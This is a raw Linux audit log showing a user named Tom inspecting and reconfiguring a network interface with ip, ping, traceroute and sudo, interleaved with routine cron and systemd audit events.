type=PATH msg=audit(1789397282.930:57): item=1 name="/usr/bin/ls" inode=393357 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789397282.930:57): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789397282.930:57): proctitle=6C73002D2D636F6C6F723D6175746F
type=SYSCALL msg=audit(1789397287.718:58): arch=c000003e syscall=59 success=yes exit=0 a0=56165986a2f0 a1=5616597f5aa0 a2=5616597dc390 a3=3e8b3e06fdcb648 items=3 ppid=770 pid=775 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="ip" exe="/usr/bin/ip" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789397287.718:58): argc=2 a0="ip" a1="a"
type=CWD msg=audit(1789397287.718:58): cwd="/home/Tom"
type=PATH msg=audit(1789397287.718:58): item=0 name="/usr/bin/ip" inode=398712 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789397287.718:58): item=1 name="/usr/bin/ip" inode=398712 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789397287.718:58): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789397287.718:58): proctitle=69700061
type=SYSCALL msg=audit(1789397294.218:59): arch=c000003e syscall=59 success=yes exit=0 a0=561659906440 a1=5616598d0800 a2=5616597dc390 a3=3e8b3e06fdcb648 items=3 ppid=770 pid=782 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="cat" exe="/usr/bin/cat" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789397294.218:59): argc=2 a0="cat" a1="/etc/resolv.conf"
type=CWD msg=audit(1789397294.218:59): cwd="/home/Tom"
type=PATH msg=audit(1789397294.218:59): item=0 name="/usr/bin/cat" inode=393339 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789397294.218:59): item=1 name="/usr/bin/cat" inode=393339 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789397294.218:59): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789397294.218:59): proctitle=636174002F6574632F7265736F6C762E636F6E66
type=SYSCALL msg=audit(1789397298.034:60): arch=c000003e syscall=59 success=yes exit=0 a0=5616597d9d40 a1=561659905df0 a2=5616597dc390 a3=3e8b3e06fdcb648 items=3 ppid=770 pid=783 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="ping" exe="/usr/bin/ping" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=BPRM_FCAPS msg=audit(1789397298.034:60): fver=2 fp=0000000000002000 fi=0 fe=1 old_pp=0 old_pi=0 old_pe=0 old_pa=0 pp=0000000000002000 pi=0 pe=0000000000002000 pa=0 frootid=0
type=EXECVE msg=audit(1789397298.034:60): argc=2 a0="ping" a1="8.8.8.8"
type=CWD msg=audit(1789397298.034:60): cwd="/home/Tom"
type=PATH msg=audit(1789397298.034:60): item=0 name="/usr/bin/ping" inode=395643 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0000000000002000 cap_fi=0 cap_fe=1 cap_fver=2 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789397298.034:60): item=1 name="/usr/bin/ping" inode=395643 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0000000000002000 cap_fi=0 cap_fe=1 cap_fver=2 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789397298.034:60): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789397298.034:60): proctitle=70696E6700382E382E382E38
type=SYSCALL msg=audit(1789397313.318:61): arch=c000003e syscall=59 success=yes exit=0 a0=5616598454f0 a1=5616598a5c70 a2=5616597dc390 a3=3e8b3e06fdcb648 items=3 ppid=770 pid=784 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="traceroute" exe="/usr/bin/traceroute.db" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789397313.318:61): argc=2 a0="traceroute" a1="8.8.8.8"
type=CWD msg=audit(1789397313.318:61): cwd="/home/Tom"
type=PATH msg=audit(1789397313.318:61): item=0 name="/usr/bin/traceroute" inode=421635 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789397313.318:61): item=1 name="/usr/bin/traceroute" inode=423737 dev=08:02 mode=0120777 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789397313.318:61): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789397313.318:61): proctitle=7472616365726F75746500382E382E382E38
type=SYSCALL msg=audit(1789397681.006:62): arch=c000003e syscall=59 success=yes exit=0 a0=5616597daef0 a1=5616598d83f0 a2=5616597dc390 a3=3e8b3e06fdcb648 items=3 ppid=770 pid=789 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="ip" exe="/usr/bin/ip" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789397681.006:62): argc=2 a0="ip" a1="a"
type=CWD msg=audit(1789397681.006:62): cwd="/home/Tom"
type=PATH msg=audit(1789397681.006:62): item=0 name="/usr/bin/ip" inode=398712 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789397681.006:62): item=1 name="/usr/bin/ip" inode=398712 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789397681.006:62): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789397681.006:62): proctitle=69700061
type=SERVICE_START msg=audit(1789398152.538:63): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=systemd-tmpfiles-clean comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_STOP msg=audit(1789398152.538:64): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=systemd-tmpfiles-clean comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=USER_ACCT msg=audit(1789399021.078:65): pid=802 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:accounting grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="unset"
type=CRED_ACQ msg=audit(1789399021.078:66): pid=802 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="unset"
type=LOGIN msg=audit(1789399021.078:67): pid=802 uid=0 subj=unconfined old-auid=4294967295 auid=0 tty=(none) old-ses=4294967295 ses=3 res=1UID="root" OLD-AUID="unset" AUID="root"
type=SYSCALL msg=audit(1789399021.078:67): arch=c000003e syscall=1 success=yes exit=1 a0=7 a1=7fff6b6c6cd0 a2=1 a3=7fff6b6c69e7 items=0 ppid=515 pid=802 auid=0 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=3 comm="cron" exe="/usr/sbin/cron" subj=unconfined key=(null)ARCH=x86_64 SYSCALL=write AUID="root" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
type=PROCTITLE msg=audit(1789399021.078:67): proctitle=2F7573722F7362696E2F43524F4E002D66
type=USER_START msg=audit(1789399021.078:68): pid=802 uid=0 auid=0 ses=3 subj=unconfined msg='op=PAM:session_open grantors=pam_loginuid,pam_env,pam_env,pam_permit,pam_unix,pam_limits acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=CRED_REFR msg=audit(1789399021.078:69): pid=803 uid=0 auid=0 ses=3 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=CRED_DISP msg=audit(1789399021.142:70): pid=802 uid=0 auid=0 ses=3 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=USER_END msg=audit(1789399021.142:71): pid=802 uid=0 auid=0 ses=3 subj=unconfined msg='op=PAM:session_close grantors=pam_loginuid,pam_env,pam_env,pam_permit,pam_unix,pam_limits acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=SYSCALL msg=audit(1789399219.038:72): arch=c000003e syscall=59 success=yes exit=0 a0=5616597d9cd0 a1=5616598a91f0 a2=5616597dc390 a3=3e8b3e06fdcb648 items=3 ppid=770 pid=808 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="ip" exe="/usr/bin/ip" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789399219.038:72): argc=2 a0="ip" a1="a"
type=CWD msg=audit(1789399219.038:72): cwd="/home/Tom"
type=PATH msg=audit(1789399219.038:72): item=0 name="/usr/bin/ip" inode=398712 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789399219.038:72): item=1 name="/usr/bin/ip" inode=398712 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789399219.038:72): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789399219.038:72): proctitle=69700061
type=SYSCALL msg=audit(1789399237.970:73): arch=c000003e syscall=59 success=yes exit=0 a0=561659907180 a1=5616599068a0 a2=5616597dc390 a3=3e8b3e06fdcb648 items=3 ppid=770 pid=810 auid=1000 uid=1000 gid=1000 euid=0 suid=0 fsuid=0 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="sudo" exe="/usr/bin/sudo" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="root" SUID="root" FSUID="root" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789399237.970:73): argc=6 a0="sudo" a1="ip" a2="addr" a3="flush" a4="dev" a5="eho0"
type=CWD msg=audit(1789399237.970:73): cwd="/home/Tom"
type=PATH msg=audit(1789399237.970:73): item=0 name="/usr/bin/sudo" inode=424386 dev=08:02 mode=0104755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789399237.970:73): item=1 name="/usr/bin/sudo" inode=424386 dev=08:02 mode=0104755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789399237.970:73): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789399237.970:73): proctitle=7375646F006970006164647200666C757368006465760065686F30
type=USER_AUTH msg=audit(1789399240.694:74): pid=810 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:authentication grantors=? acct="Tom" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=failed'UID="Tom" AUID="Tom"
type=USER_CMD msg=audit(1789399240.694:75): pid=810 uid=1000 auid=1000 ses=1 subj=unconfined msg='cwd="/home/Tom" cmd=6970206164647220666C757368206465762065686F30 exe="/usr/bin/sudo" terminal=tty1 res=failed'UID="Tom" AUID="Tom"
type=SYSCALL msg=audit(1789399246.006:76): arch=c000003e syscall=59 success=yes exit=0 a0=5616597f7590 a1=5616599068a0 a2=5616597dc390 a3=3e8b3e06fdcb648 items=3 ppid=770 pid=811 auid=1000 uid=1000 gid=1000 euid=0 suid=0 fsuid=0 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="sudo" exe="/usr/bin/sudo" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="root" SUID="root" FSUID="root" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789399246.006:76): argc=6 a0="sudo" a1="ip" a2="addr" a3="flush" a4="dev" a5="eth0"
type=CWD msg=audit(1789399246.006:76): cwd="/home/Tom"
type=PATH msg=audit(1789399246.006:76): item=0 name="/usr/bin/sudo" inode=424386 dev=08:02 mode=0104755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789399246.006:76): item=1 name="/usr/bin/sudo" inode=424386 dev=08:02 mode=0104755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789399246.006:76): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789399246.006:76): proctitle=7375646F006970006164647200666C757368006465760065746830
type=USER_AUTH msg=audit(1789399251.318:77): pid=811 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:authentication grantors=pam_permit acct="Tom" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=USER_ACCT msg=audit(1789399251.318:78): pid=811 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:accounting grantors=pam_permit acct="Tom" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=USER_CMD msg=audit(1789399251.318:79): pid=811 uid=1000 auid=1000 ses=1 subj=unconfined msg='cwd="/home/Tom" cmd=6970206164647220666C757368206465762065746830 exe="/usr/bin/sudo" terminal=tty1 res=success'UID="Tom" AUID="Tom"
type=CRED_REFR msg=audit(1789399251.318:80): pid=811 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=USER_START msg=audit(1789399251.318:81): pid=811 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:session_open grantors=pam_limits,pam_permit,pam_unix acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=USER_END msg=audit(1789399251.322:82): pid=811 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:session_close grantors=pam_limits,pam_permit,pam_unix acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=CRED_DISP msg=audit(1789399251.322:83): pid=811 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=SYSCALL msg=audit(1789399270.542:84): arch=c000003e syscall=59 success=yes exit=0 a0=561659902e60 a1=5616598b72a0 a2=5616597dc390 a3=3e8b3e06fdcb648 items=3 ppid=770 pid=814 auid=1000 uid=1000 gid=1000 euid=0 suid=0 fsuid=0 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="sudo" exe="/usr/bin/sudo" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="root" SUID="root" FSUID="root" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789399270.542:84): argc=7 a0="sudo" a1="ip" a2="addr" a3="add" a4="192.168.0.21/24" a5="dev" a6="eth0"
type=CWD msg=audit(1789399270.542:84): cwd="/home/Tom"
type=PATH msg=audit(1789399270.542:84): item=0 name="/usr/bin/sudo" inode=424386 dev=08:02 mode=0104755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789399270.542:84): item=1 name="/usr/bin/sudo" inode=424386 dev=08:02 mode=0104755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789399270.542:84): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789399270.542:84): proctitle=7375646F006970006164647200616464003139322E3136382E302E32312F3234006465760065746830
type=USER_ACCT msg=audit(1789399270.546:85): pid=814 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:accounting grantors=pam_permit acct="Tom" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=USER_CMD msg=audit(1789399270.546:86): pid=814 uid=1000 auid=1000 ses=1 subj=unconfined msg='cwd="/home/Tom" cmd=6970206164647220616464203139322E3136382E302E32312F3234206465762065746830 exe="/usr/bin/sudo" terminal=tty1 res=success'UID="Tom" AUID="Tom"
type=CRED_REFR msg=audit(1789399270.546:87): pid=814 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=USER_START msg=audit(1789399270.550:88): pid=814 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:session_open grantors=pam_limits,pam_permit,pam_unix acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=USER_END msg=audit(1789399270.554:89): pid=814 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:session_close grantors=pam_limits,pam_permit,pam_unix acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=CRED_DISP msg=audit(1789399270.554:90): pid=814 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=SYSCALL msg=audit(1789399281.194:91): arch=c000003e syscall=59 success=yes exit=0 a0=561659906440 a1=56165990b910 a2=5616597dc390 a3=3e8b3e06fdcb648 items=3 ppid=770 pid=817 auid=1000 uid=1000 gid=1000 euid=0 suid=0 fsuid=0 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="sudo" exe="/usr/bin/sudo" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="root" SUID="root" FSUID="root" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789399281.194:91): argc=6 a0="sudo" a1="ip" a2="linke" a3="set" a4="eth0" a5="up"
type=CWD msg=audit(1789399281.194:91): cwd="/home/Tom"
type=PATH msg=audit(1789399281.194:91): item=0 name="/usr/bin/sudo" inode=424386 dev=08:02 mode=0104755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789399281.194:91): item=1 name="/usr/bin/sudo" inode=424386 dev=08:02 mode=0104755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789399281.194:91): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789399281.194:91): proctitle=7375646F006970006C696E6B65007365740065746830007570
type=USER_ACCT msg=audit(1789399281.202:92): pid=817 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:accounting grantors=pam_permit acct="Tom" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=USER_CMD msg=audit(1789399281.202:93): pid=817 uid=1000 auid=1000 ses=1 subj=unconfined msg='cwd="/home/Tom" cmd=6970206C696E6B65207365742065746830207570 exe="/usr/bin/sudo" terminal=tty1 res=success'UID="Tom" AUID="Tom"
type=CRED_REFR msg=audit(1789399281.202:94): pid=817 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=USER_START msg=audit(1789399281.202:95): pid=817 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:session_open grantors=pam_limits,pam_permit,pam_unix acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=USER_END msg=audit(1789399281.210:96): pid=817 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:session_close grantors=pam_limits,pam_permit,pam_unix acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=CRED_DISP msg=audit(1789399281.210:97): pid=817 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=SYSCALL msg=audit(1789399291.734:98): arch=c000003e syscall=59 success=yes exit=0 a0=5616598d8f50 a1=56165990b910 a2=5616597dc390 a3=3e8b3e06fdcb648 items=3 ppid=770 pid=820 auid=1000 uid=1000 gid=1000 euid=0 suid=0 fsuid=0 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="sudo" exe="/usr/bin/sudo" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="root" SUID="root" FSUID="root" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789399291.734:98): argc=6 a0="sudo" a1="ip" a2="link" a3="set" a4="eth0" a5="up"
type=CWD msg=audit(1789399291.734:98): cwd="/home/Tom"
type=PATH msg=audit(1789399291.734:98): item=0 name="/usr/bin/sudo" inode=424386 dev=08:02 mode=0104755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789399291.734:98): item=1 name="/usr/bin/sudo" inode=424386 dev=08:02 mode=0104755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789399291.734:98): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789399291.734:98): proctitle=7375646F006970006C696E6B007365740065746830007570
type=USER_ACCT msg=audit(1789399291.742:99): pid=820 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:accounting grantors=pam_permit acct="Tom" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=USER_CMD msg=audit(1789399291.746:100): pid=820 uid=1000 auid=1000 ses=1 subj=unconfined msg='cwd="/home/Tom" cmd=6970206C696E6B207365742065746830207570 exe="/usr/bin/sudo" terminal=tty1 res=success'UID="Tom" AUID="Tom"
type=CRED_REFR msg=audit(1789399291.746:101): pid=820 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=USER_START msg=audit(1789399291.746:102): pid=820 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:session_open grantors=pam_limits,pam_permit,pam_unix acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
